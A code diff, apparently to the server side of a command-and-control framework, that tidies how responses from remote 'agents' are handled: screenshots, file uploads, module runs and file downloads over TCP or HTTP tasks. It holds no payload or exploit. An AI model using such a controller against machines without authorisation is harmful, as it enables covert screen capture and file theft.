@@ -218,7 +218,10 @@ def callback_handler(agent_id, header, conn_type, *argv, response=None, task=Non
             case "SCREENSHOT":
                 file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                 common.save_file(response, file_path,True)
-                return f"Screenshot saved at {file_path}"
+                return printer.success(f"Screenshot saved at {file_path}")
+            
+            case "UPLOAD_FILE_OK":
+                return printer.success(response.decode())
             
             case "DOWNLOAD_FILE_NOTFOUND":
                 return printer.fail(f"File {response.decode()} not found")
@@ -238,15 +241,18 @@ def callback_handler(agent_id, header, conn_type, *argv, response=None, task=Non
                 response = response
                 file_path = f"data/{agent_id}/screenshots/{common.time_now_str_only_lines()}.png"
                 common.save_file(response, file_path,True)
-                return f"Screenshot saved at {file_path}".encode()
+                return printer.success(f"Screenshot saved at {file_path}").encode()
+            
+            case "UPLOAD_FILE_OK":
+                return printer.success(response.decode()).encode()
             
             case "DOWNLOAD_FILE_NOTFOUND":
-                return printer.fail(f"File {response.decode()} not found")
+                return printer.fail(f"File {response.decode()} not found").encode()
             
             case "DOWNLOAD_FILE_OK":
                 file_path = f"data/{agent_id}/download/{task.command}"
                 common.save_file(response, file_path,True)
-                return printer.success(f"File saved at {file_path}")
+                return printer.success(f"File saved at {file_path}").encode()
             case _:
                 return response
 
@@ -280,13 +286,13 @@ def module(agent, arg, conn_type):
     if conn_type == "tcp":
         tcp.send_data(agent.conn, module, header)
         header ,response = tcp.recv_data(agent.conn, binary=True)
-        response = callback_handler(agent.id, header, conn_type, response)
+        response = callback_handler(agent.id, header, conn_type, response=response)
         
     elif conn_type == "http":
         task_id = taskmng.add_task(agent.id, module_name, header, module)
-        response = f"Task {task_id} added"
+        response = printer.success(f"Task {task_id} added")
 
-    return printer.success(response)
+    return response
 
 
 def upload(agent, data, conn_type):
@@ -303,13 +309,14 @@ def upload(agent, data, conn_type):
     if conn_type == "tcp":
 
         tcp.send_data(agent.conn, data, header)
-        _, response = tcp.recv_data(agent.conn)
+        header, response = tcp.recv_data(agent.conn, True)
+        response = callback_handler(agent.id, header, conn_type, response=response)
         
     elif conn_type == "http":
         task_id = taskmng.add_task(agent.id, f"upload {file_name}", header, data)
-        response = f"Task {task_id} added"
+        response = printer.success(f"Task {task_id} added")
 
-    return printer.success(response)
+    return response
 
 def download(agent, data, conn_type):
     if not data:
